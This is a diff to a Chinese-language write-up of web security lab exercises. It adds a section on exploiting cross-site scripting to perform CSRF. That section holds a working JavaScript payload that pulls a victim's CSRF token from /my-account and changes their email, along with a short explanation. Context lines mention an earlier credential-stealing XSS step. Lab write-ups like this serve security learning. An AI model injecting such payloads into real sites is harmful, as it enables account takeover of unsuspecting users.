@@ -436,3 +436,24 @@ function hax() {
 ```
 
 这样会在`postID`为`1`的文章评论中找到用户名和密码。但没有成功复现，通过debug会发现，`fetch`会返回`400`，可能是官方为了减少非预期解，毕竟是靶场。
+
+## 24. Exploiting XSS to perform CSRF
+
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test%40test.com')
+};
+</script>
+```
+
+直接搬的官方payload，把`@`做了url encoding，防止报错，虽然不做也可以过。
+
+就是新建一个请求，然后访问`/my-account`，然后记录CSRF Token，最后请求修改email即可。
